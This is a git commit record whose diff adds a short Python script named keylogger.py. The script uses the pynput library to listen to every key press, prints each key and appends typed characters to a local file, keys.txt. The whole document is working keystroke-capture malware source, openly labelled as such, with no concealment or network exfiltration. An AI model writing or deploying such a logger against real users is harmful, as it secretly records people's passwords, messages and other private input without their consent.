4e09775fbb3305cd5685a7c07759975697d61904
Nakov <77243772+IvanNakov10@users.noreply.github.com>
2023-02-05 12:14:28 +0200

    finished

--- keylogger.py
+++ keylogger.py
@@ -1,1 +1,15 @@
 from pynput import keyboard
+
+def KeyPressed(key):
+    print(str(key))
+    with open ("keys.txt", 'a') as logkey:
+        try:
+            char = key.char
+            logkey.write(char)
+        except:
+            print("errror")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=KeyPressed)
+    listener.start()
+    input()
